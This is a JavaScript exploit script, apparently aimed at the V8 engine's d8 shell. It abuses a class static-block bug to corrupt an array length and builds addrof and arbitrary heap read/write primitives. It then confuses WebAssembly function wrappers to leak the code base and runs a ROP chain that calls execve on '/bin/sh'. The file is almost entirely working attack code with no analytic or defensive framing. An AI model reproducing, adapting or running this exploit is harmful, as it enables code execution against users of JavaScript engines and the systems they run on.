const pad1 = "";
const pad2 = "";
const pad3 = "";
const pad4 = "";
let v1;
var cor = [1.1];
var obj_arr = [cor, cor];
var dbl_arr = [1.1];

new ArrayBuffer(0x7fe00000);

function f() {
  class C {
    static {
      v1 = cor;
    }
  }
  C[1] = 0x8000;
}

for (var i = 0; i < 0x2000; i++) {
  f();
  f();
  f();
  f();
}

console.log("length:", cor.length);

class Helpers {
  constructor() {
    this.buf = new ArrayBuffer(8);
    this.dv = new DataView(this.buf);
    this.u8 = new Uint8Array(this.buf);
    this.u32 = new Uint32Array(this.buf);
    this.u64 = new BigUint64Array(this.buf);
    this.f32 = new Float32Array(this.buf);
    this.f64 = new Float64Array(this.buf);

    this.roots = new Array(0x30000);
    this.index = 0;
  }

  pair_i32_to_f64(p1, p2) {
    this.u32[0] = p1;
    this.u32[1] = p2;
    return this.f64[0];
  }

  i64tof64(i) {
    this.u64[0] = i;
    return this.f64[0];
  }

  f64toi64(f) {
    this.f64[0] = f;
    return this.u64[0];
  }

  set_i64(i) {
    this.u64[0] = i;
  }

  set_l(i) {
    this.u32[0] = i;
  }

  set_h(i) {
    this.u32[1] = i;
  }

  get_i64() {
    return this.u64[0];
  }

  ftoil(f) {
    this.f64[0] = f;
    return this.u32[0];
  }

  ftoih(f) {
    this.f64[0] = f;
    return this.u32[1];
  }

  add_ref(object) {
    this.roots[this.index++] = object;
  }

  hex_to_dbl(hexString) {
    if (hexString.startsWith("0x")) {
      hexString = hexString.substring(2);
    }

    for (let i = 0; i < 8; i++) {
      const byte = hexString.substring(
        hexString.length - (i + 1) * 2,
        hexString.length - i * 2,
      );
      this.u8[i] = parseInt(byte, 16);
    }

    const float64 = new Float64Array(this.u8.buffer);
    return float64[0];
  }

  mark_sweep_gc() {
    new ArrayBuffer(0x7fe00000);
  }

  scavenge_gc() {
    for (var i = 0; i < 8; i++) {
      // fill up new space external backing store bytes
      this.add_ref(new ArrayBuffer(0x200000));
    }
    this.add_ref(new ArrayBuffer(8));
  }

  hex(i) {
    return i.toString(16).padStart(16, "0");
  }

  breakpoint() {
    this.buf.slice();
  }
}

var helper = new Helpers();

function addrof(o) {
  obj_arr[0] = o;
  return helper.ftoil(cor[4]);
}

function aar(addr) {
  cor[10] = helper.pair_i32_to_f64(addr - 8, 0x8000);
  return dbl_arr[0];
}

function aaw(addr, val) {
  cor[10] = helper.pair_i32_to_f64(addr - 8, 0x8000);
  dbl_arr[0] = val;
}

function readHeap4(addr) {
  return helper.ftoil(aar(addr));
}

function writeHeap4(addr, val) {
  let pad = helper.ftoih(aar(addr));
  aaw(addr, helper.pair_i32_to_f64(val, pad));
}

let arr = [4.94065645841246544176568792868e-324];

let cagebase = BigInt(helper.ftoil(aar(0x4d)));
let arr_addr = addrof(arr);
let elements = BigInt(helper.ftoil(aar(arr_addr + 8)));
let one_addr = (cagebase << 32n) | (elements + 7n);
let binsh = 0x0068732f6e69622fn;

let base = BigInt(readHeap4(0x4c + 1)) << 32n;
console.log(base.toString(16));
let binsh_addr = base + BigInt(addrof(binsh) + 8 - 1);
let zero_addr = base + 8n;
console.log(binsh_addr.toString(16));
console.log(zero_addr.toString(16));

// d8.file.execute("../../test/mjsunit/wasm/wasm-module-builder.js");
// let builder = new WasmModuleBuilder();

// builder.addFunction("read", makeSig([], [])).exportFunc().addBody([]);
// builder
//   .addFunction(
//     "read2",
//     makeSig(
//       [],
//       [
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//       ],
//     ),
//   )
//   .exportFunc()
//   .addBody([
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//   ]);

// builder
//   .addFunction("write", makeSig([kWasmF64, kWasmF64, kWasmF64, kWasmF64], []))
//   .exportFunc()
//   .addBody([]);

// let rebase = (addr) => {
//   return [
//     kExprLocalGet,
//     0,
//     ...wasmF64Const(helper.i64tof64(addr)),
//     kExprF64Add,
//   ];
// };

// //         ...rebase(0x01a131ebn),                             // pop rdi; ret;
// //         ...rebase(0x01951024n),                             // pop rsi; ret;
// //         ...rebase(0x0156fac1n),                             // pop rdx; ret;
// //         ...rebase(0x018d86a8n),                             // pop rax; ret;
// //         ...rebase(0x01a0e8a0n),                             // syscall;

// builder
//   .addFunction(
//     "write2",
//     makeSig(
//       [kWasmF64, kWasmF64, kWasmF64, kWasmF64],
//       [
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//         kWasmF64,
//       ],
//     ),
//   )
//   .exportFunc()
//   .addBody([
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     kExprLocalGet,
//     1, // rbp-0x20
//     ...wasmF64Const(0), // rbp-0x18
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...rebase(0x01a131ebn), // pop rdi; ret;
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     kExprLocalGet,
//     2,
//     // ...wasmF64Const(helper.i64tof64(binsh_addr)),      // '//bin/sh'
//     ...rebase(0x01951024n), // pop rsi; ret;
//     kExprLocalGet,
//     3,
//     // ...wasmF64Const(helper.i64tof64(zero_addr)),      // 0
//     ...rebase(0x0156fac1n),                             // pop rdx; ret;
//     kExprLocalGet,
//     3,
//     // ...wasmF64Const(helper.i64tof64(zero_addr)),      // 0
//     ...rebase(0x018d86a8n), // pop rax; ret;
//     ...wasmF64Const(helper.i64tof64(0x3bn)),
//     ...rebase(0x01a0e8a0n), // syscall;
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     ...wasmF64Const(),
//     // ...wasmF64Const(),
//     // ...wasmF64Const(),
//     // ...wasmF64Const(),
//     // ...wasmF64Const(),
//   ]);
// console.log(builder.toBuffer());
// let instance = builder.instantiate();

let wasmCode = new Uint8Array([
  0,97,115,109,1,0,0,0,1,111,4,96,0,0,96,0,45,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,96,4,124,124,124,124,0,96,4,124,124,124,124,45,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,3,5,4,0,1,2,3,7,33,4,4,114,101,97,100,0,0,5,114,101,97,100,50,0,1,5,119,114,105,116,101,0,2,6,119,114,105,116,101,50,0,3,10,172,6,4,2,0,11,151,3,0,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,11,2,0,11,138,3,0,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,32,1,68,0,0,0,0,0,0,0,0,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,32,0,68,235,49,161,1,0,0,0,0,160,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,32,2,32,0,68,36,16,149,1,0,0,0,0,160,32,3,32,0,68,193,250,86,1,0,0,0,0,160,32,3,32,0,68,168,134,141,1,0,0,0,0,160,68,59,0,0,0,0,0,0,0,32,0,68,160,232,160,1,0,0,0,0,160,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,68,0,0,0,0,0,0,248,127,11,0,36,4,110,97,109,101,1,29,4,0,4,114,101,97,100,1,5,114,101,97,100,50,2,5,119,114,105,116,101,3,6,119,114,105,116,101,50
]);
let wasmModule = new WebAssembly.Module(wasmCode);
var instance = new WebAssembly.Instance(wasmModule, {});

let write = instance.exports.write;
let write2 = instance.exports.write2;
let read = instance.exports.read;
let read2 = instance.exports.read2;

for (var i = 0; i < 1001; i++) {
  write();
}
for (var i = 0; i < 1001; i++) {
  read2();
}

let jstowasm_read = readHeap4(addrof(read2) + 0xc);
writeHeap4(addrof(read) + 0xc, jstowasm_read);

let res = read();

code_base = helper.f64toi64(res[2]) - 0xa20931n;
console.log("code base:", code_base.toString(16));

let jstowasm_write = readHeap4(addrof(write) + 0xc);
writeHeap4(addrof(write2) + 0xc, jstowasm_write);

write2(
  helper.i64tof64(code_base),
  helper.i64tof64(one_addr),
  helper.i64tof64(binsh_addr),
  helper.i64tof64(zero_addr),
);
